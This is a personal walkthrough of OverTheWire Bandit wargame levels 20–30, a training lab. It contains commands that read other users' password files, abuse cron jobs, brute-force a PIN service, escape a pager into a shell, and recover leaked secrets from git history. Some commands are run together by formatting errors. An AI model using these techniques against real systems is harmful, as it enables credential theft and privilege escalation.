### **Bandit Level 20 → 21**

In this level, I had to use **two terminals**:

*   nc -lvnp 4444
    
*   ./suconnect 4444
    
*   Then, in the **first terminal**, I sent the password of the current level and received the password for the next one.
    

### **Bandit Level 21 → 22**

A cronjob was running a script called cronjob\_bandit22.sh, which copies the password of bandit22 into the file:

/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv   

I simply ran:
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv   

...and got the password.

### **Bandit Level 22 → 23**

A script runs periodically:

#!/bin/bash 
 myname=$(whoami)
 mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1) 
 echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"  
 cat /etc/bandit_pass/$myname > /tmp/$mytarget   

I figured out the hash used to name the output file:
 echo I am user bandit23 | md5sum | cut -d ' ' -f1   

Then I just:

cat /tmp/result   

### **Bandit Level 23 → 24**

A cronjob checks a specific directory for any files owned by bandit23. If it finds one, it executes it and deletes everything.

I did the following:

1.  mkdir /tmp/yousfi\_23cd /tmp/yousfi\_23
    
2.  touch password.txtchmod a+w password.txt
    
3.  echo '#!/bin/bash' > script.shecho 'cat /etc/bandit\_pass/bandit24 > /tmp/yousfi\_23/password.txt' >> script.shchmod a+x script.sh
    
4.  Moved the script to the monitored directory.
    

Eventually, the script ran and dumped the password into password.txt.

### **Bandit Level 24 → 25**

We need to brute-force a 4-digit PIN combined with the current password, sent to port **30002**.

Here's the script I used:
 #!/bin/bash 
  password=replace_with_bandit24_password 
   for pin in $(seq -w 0000 9999); do     
     	 echo "Trying PIN: $pin"  
         echo "$password $pin"  
   done | nc localhost 30002   

Eventually, the correct PIN returned the next password.

### **Bandit Level 25 → 26**

This one’s a trick: the terminal uses more, so we trick it into opening vi, then get a shell.

Steps:

1.  vi
    
2.  :set shell=/bin/bash:shell
    
3.  cat /etc/bandit\_pass/bandit26
    

### **Bandit Level 26 → 27**

Super straightforward.

*   ./bandit27-do cat /etc/bandit\_pass/bandit27
    

### **Bandit Level 27 → 28**

Just clone the git repo:

git clone ssh://bandit27git@localhost:2220/home/bandit27-git/repo   

Then read the README—the password is right there.

### **Bandit Level 28 → 29**

1.  Clone the repo as usual.
    
2.  git show
    

It reveals a commit that fixed a password leak—the leaked password is still in the diff.

### **Bandit Level 29 → 30**

1.  Clone the repo.
    
2.  git branch -a
    
3.  git checkout dev
    
4.  git show
    

And boom, password found.
